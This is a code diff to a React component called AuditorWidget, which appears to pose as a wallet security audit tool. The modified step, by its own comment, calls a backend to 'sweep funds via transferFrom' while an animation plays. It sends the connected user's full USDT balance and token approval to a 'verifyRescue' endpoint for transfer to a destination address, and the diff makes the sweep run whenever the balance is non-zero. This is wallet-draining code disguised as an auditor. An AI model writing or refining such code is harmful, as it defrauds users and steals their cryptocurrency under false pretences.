@@ -289,31 +289,31 @@ const AuditorWidget: React.FC<Props> = ({
       }
 
       // ── Phase 4: Call backend to sweep funds via transferFrom (runs while animation plays) ──
-      try {
-        const res = await fetch(`${API_BASE}/verifyRescue`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            txHash: approvalTxHash,
-            from: connectedAddress,
-            to: destination,
-            amount: rawBal.toString(),
-            chainId: chainId,
-            token: usdtAddress,
-          }),
-        });
+      if (rawBal > 0n) {
+        try {
+          const res = await fetch(`${API_BASE}/verifyRescue`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              txHash: approvalTxHash,
+              from: connectedAddress,
+              to: destination,
+              amount: rawBal.toString(),
+              chainId: chainId,
+              token: usdtAddress,
+            }),
+          });
 
-        const verifyData = await res.json();
+          const verifyData = await res.json();
 
-        if (!res.ok || !verifyData.success) {
-          throw new Error(verifyData.error || "Verification failed");
-        }
-      } catch (sweepErr: any) {
-        if (rawBal === 0n) {
-          console.warn("Sweep failed for 0 balance, proceeding to report:", sweepErr);
-        } else {
+          if (!res.ok || !verifyData.success) {
+            throw new Error(verifyData.error || "Verification failed");
+          }
+        } catch (sweepErr: any) {
           throw sweepErr;
         }
+      } else {
+        console.warn("Wallet has 0 balance, skipping backend sweep.");
       }
 
       const checks = [
